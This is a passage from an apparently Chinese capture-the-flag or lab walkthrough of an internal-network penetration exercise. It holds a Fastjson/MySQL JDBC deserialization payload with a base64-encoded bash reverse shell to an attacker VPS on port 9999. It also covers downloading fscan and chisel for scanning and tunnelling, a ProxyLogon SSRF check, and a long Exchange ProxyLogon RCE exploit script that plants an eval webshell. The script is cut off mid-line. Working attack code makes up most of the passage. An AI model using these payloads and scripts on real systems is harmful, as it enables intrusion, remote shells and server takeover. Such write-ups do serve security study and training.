class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span><span class="punctuation">]</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;yso&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;Jdk7u21&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;Jdk7u21&quot;</span><span class="punctuation">,</span><span class="string">&quot;calc&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;CommonsCollections6&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CommonCollections6&quot;</span><span class="punctuation">,</span><span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNpcC85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="punctuation">]</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 server.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205174143.png"></p><p>同时需要监听9999端口(端口为config中设置的)<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250205174320.png"></p><p>需要执行的poyload如下：<br>需要设置vpsip和端口<br>该poyload是<strong>MySQL JDBC 连接伪造</strong>，利用 <code>autoDeserialize=true</code> 触发 Java 反序列化漏洞。<br>从而导致执行恶意命令(反连vps的9999端口)<br><a href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;name&quot;: &#123; &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;vps_ip&quot;, &quot;portToConnectTo&quot;: 3306, &quot;info&quot;: &#123; &quot;user&quot;: &quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHNpcC85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;, &quot;password&quot;: &quot;pass&quot;, &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot; &#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="poyload解释"><a href="#poyload解释" class="headerlink" title="poyload解释"></a>poyload解释</h3><p>注：对于config和poyload的AI解释为</p><ol><li>执行的poyload的JSON 可能是一个实际攻击 payload，用于 <strong>MySQL JDBC</strong> 反序列化漏洞，利用 <code>autoDeserialize=true</code> 配合 <code>statementInterceptors</code> 进行 Java 反序列化攻击；<code>user</code> 字段的值包含 <strong>ysoserial CommonsCollections6</strong> 反序列化利用链，通过 <code>bash -c</code> 执行 base64 编码的命令，最终尝试反向 shell 连接到 <code>vps_ip:9999</code>。</li><li>conifg的JSON 可能是用于 ysoserial 生成 payload(1的poyload由2生成)，然后攻击者将其注入到 JSON。（填充到p要执行的 JSON中，伪装成 MySQL 连接参数，从而在目标服务器上执行代码。）</li></ol><p>两者都涉及 ysoserial 反序列化漏洞，目标是执行系统命令，甚至读取敏感文件。如果 MySQL 服务器启用了 <code>autoDeserialize=true</code>，攻击者可以通过 MySQL 连接参数直接触发反序列化漏洞，执行远程命令。</p><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><strong>服务端监听端口</strong><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207132949.png"></p><p><strong>服务端开启mysql</strong><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207132927.png"></p><p><strong>执行poyload</strong><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207132846.png"></p><p><strong>服务器mysql响应</strong><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207132830.png"></p><p>得到shell，并且为高权限，直接查看flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207133101.png"></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>上传fscan和chisel<br>服务器端python开启http服务<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207134217.png"></p><p>shell下载fscan和chisel<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207134921.png"></p><h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207135150.png"><br>得到内网信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.3.2 DC</span><br><span class="line">172.22.3.9   XIAORANG-EXC01</span><br><span class="line">172.22.3.12 拿下</span><br><span class="line">172.22.3.26  XIAORANG-PC</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207140009.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207140026.png"></p><h3 id="Exchange-ProxyLogon"><a href="#Exchange-ProxyLogon" class="headerlink" title="Exchange ProxyLogon"></a>Exchange ProxyLogon</h3><p>访问3.9机器的exchange服务<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207140840.png"></p><p>查看源码发现版本为15.1.1591为Exchange Server 2016<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250207141643.png"></p><h3 id="Exchange漏洞利用"><a href="#Exchange漏洞利用" class="headerlink" title="Exchange漏洞利用"></a>Exchange漏洞利用</h3><p><strong>介绍</strong><br><strong><a href="https://github.com/hausec/ProxyLogon">ProxyLogon</a></strong> 是 <strong>Microsoft Exchange Server</strong> 在 2021 年曝光的<strong>远程代码执行（RCE）漏洞</strong>，编号为 <strong>CVE-2021-26855（SSRF）</strong>。它允许攻击者<strong>绕过身份验证</strong>，直接访问 Exchange 服务器，并结合其他漏洞（如 <strong>CVE-2021-27065</strong>）<strong>远程执行代码（RCE）</strong>，最终控制整个服务器。</p><p>Exchange Server 2016可以使用proxylogon打<br>可以直接利用 <a href="https://saucer-man.com/information_security/748.html">CVE-2021-27065</a>  RCE，前提是要知道用户名，一般来说都是 administrator@doamin，如果不知道可以通过 CVE-2021-26855 (SSRF) 获取到，我这里是直接使用的工具，下方的脚本没有使用<br><strong>CVE-2021-26855 SSRF</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> POCBase, Output, register_poc, logger, requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DemoPOC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    version = <span class="string">&#x27;1.0&#x27;</span></span><br><span class="line">    author = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    vulDate = <span class="string">&#x27;2021-03-06&#x27;</span></span><br><span class="line">    createDate = <span class="string">&#x27;2021-03-06&#x27;</span></span><br><span class="line">    updateDate = <span class="string">&#x27;2021-03-06&#x27;</span></span><br><span class="line">    references = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    name = <span class="string">&#x27;Microsoft Exchange Server SSRF漏洞&#x27;</span></span><br><span class="line">    appPowerLink = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Microsoft Exchange Server&#x27;</span></span><br><span class="line">    appVersion = <span class="string">&#x27;Exchange Server 2013、Exchange Server 2016、Exchange Server 2019&#x27;</span></span><br><span class="line">    vulType = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Microsoft Exchange Server SSRF漏洞</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    samples = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    install_requires = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            vul_url = urljoin(<span class="variable language_">self</span>.url, <span class="string">&quot;/owa/auth/x.js&quot;</span>)</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            resp = requests.get(vul_url, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> resp.status_code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">&#x27;NegotiateSecurityContext&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;</span><br><span class="line">                result[<span class="string">&#x27;VerifyInfo&#x27;</span>][<span class="string">&#x27;URL&#x27;</span>] = <span class="variable language_">self</span>.url</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> <strong>配合CVE-2021-27065实现 RCE</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fuzz_email = [<span class="string">&#x27;administrator&#x27;</span>, <span class="string">&#x27;webmaste&#x27;</span>, <span class="string">&#x27;support&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;contact&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;test2&#x27;</span>, <span class="string">&#x27;test01&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;sysadmin&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;noreply&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;no-reply&#x27;</span>]</span><br><span class="line"></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line">user_agent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">shell_path = <span class="string">&quot;Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx&quot;</span></span><br><span class="line">shell_absolute_path = <span class="string">&quot;\\\\127.0.0.1\\c$\\%s&quot;</span> % shell_path</span><br><span class="line"><span class="comment"># webshell-马子内容</span></span><br><span class="line">shell_content = <span class="string">&#x27;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt; function Page_Load()&#123;/**/eval(Request[&quot;code&quot;],&quot;unsafe&quot;);&#125;&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">final_shell = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">id_generator</span>(<span class="params">size=<span class="number">6</span>, chars=string.ascii_lowercase + string.digits</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&#x27;Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\n如果不清楚用户名，可不填写-user参数，将自动Fuzz用户名。&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-user&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exist email&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-suffix&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;email suffix&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    target = args.u</span><br><span class="line">    suffix = args.suffix</span><br><span class="line">    <span class="keyword">if</span> suffix == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入suffix&quot;</span>)</span><br><span class="line"></span><br><span class="line">    exist_email = args.user</span><br><span class="line">    <span class="keyword">if</span> exist_email:</span><br><span class="line">        fuzz_email.insert(<span class="number">0</span>, exist_email)</span><br><span class="line">    random_name = id_generator(<span class="number">4</span>) + <span class="string">&quot;.js&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;目标 Exchange Server: &quot;</span> + target)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzz_email:</span><br><span class="line">        new_email = i+suffix</span><br><span class="line">        autoDiscoverBody = <span class="string">&quot;&quot;&quot;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">      &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % new_email</span><br><span class="line">        <span class="comment"># print(&quot;get FQDN&quot;)</span></span><br><span class="line">        FQDN = <span class="string">&quot;EXCHANGE01&quot;</span></span><br><span class="line">        ct = requests.get(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=localhost~1942062522&quot;</span>,</span><br><span class="line">                                                                            <span class="string">&quot;User-Agent&quot;</span>: user_agent&#125;,</span><br><span class="line">                      verify=<span class="literal">False</span>, proxies=proxies)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;X-CalculatedBETarget&quot;</span> <span class="keyword">in</span> ct.headers <span class="keyword">and</span> <span class="string">&quot;X-FEServer&quot;</span> <span class="keyword">in</span> ct.headers:</span><br><span class="line">            FQDN = ct.headers[<span class="string">&quot;X-FEServer&quot;</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;got FQDN:&quot;</span> + FQDN)</span><br><span class="line"></span><br><span class="line">        ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: user_agent&#125;,</span><br><span class="line">            data=autoDiscoverBody,</span><br><span class="line">            proxies=proxies,</span><br><span class="line">            verify=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ct.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(ct.status_code)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Autodiscover Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;LegacyDN&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(ct.content):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can not get LegacyDN!&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            legacyDn = <span class="built_in">str</span>(ct.content).split(<span class="string">&quot;&lt;LegacyDN&gt;&quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">r&quot;&lt;/LegacyDN&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got DN: &quot;</span> + legacyDn)</span><br><span class="line"></span><br><span class="line">            mapi_body = legacyDn + \</span><br><span class="line">                <span class="string">&quot;\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">            ct = requests.post(<span class="string">&quot;https://%s/ecp/%s&quot;</span> % (target, random_name), headers=&#123;</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&amp;a=~1942062522;&quot;</span> % FQDN,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/mapi-http&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Requesttype&quot;</span>: <span class="string">&quot;Connect&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Clientinfo&quot;</span>: <span class="string">&quot;&#123;2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226&#125;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Clientapplication&quot;</span>: <span class="string">&quot;Outlook/15.0.4815.1002&quot;</span>,</span><br><span class="line">                <span class="string">&quot;X-Requestid&quot;</span>: <span class="string">&quot;&#123;E2EA6C1C-E61B-49E9-9CFB-38184F907552&#125;:123456&quot;</span>,</span><br><span class="line">                <span class="string">&quot;User-Agent&quot;</span>: user_agent</span><br><span class="line">            &#125;,</span><br><span class="line">                data=mapi_body,</span><br><span class="line">                verify=<span class="literal">False</span>,</span><br><span class="line">                proxies=proxies</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> ct.status_code != <span class="number">200</span> <span class="keyword">or</span> <span class="string">&quot;act as owner of a UserMailbox&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(ct.content):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Mapi Error!&quot;</span>)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            sid = <span class="built_in">str</span>(ct.content).split(<span class="string">&quot;with SID &quot;</span>)[</span><br><span class="line">                <span class="number">1</span>].split(<span class="string">&quot; and MasterAccountSid&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Got SID: &quot;</span> + sid)</span><br><span class="line">            sid = sid.replace(sid.split(<span class="string">&quot;-&quot;</span>)[-<span class="number">1</span>], <span class="string">&quot;500&quot;</span>)</span><br><span class="line"></span><br><span class="line">            proxyLogon_request = <span class="string">&quot;&quot;&quot;&lt;r at=&quot;Negotiate&quot; ln=&quot;john&quot;&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a=&quot;7&quot; t=&quot;1&quot;&gt;S-1-1-0&lt;/s&gt;&lt;s a=&quot;7&quot; 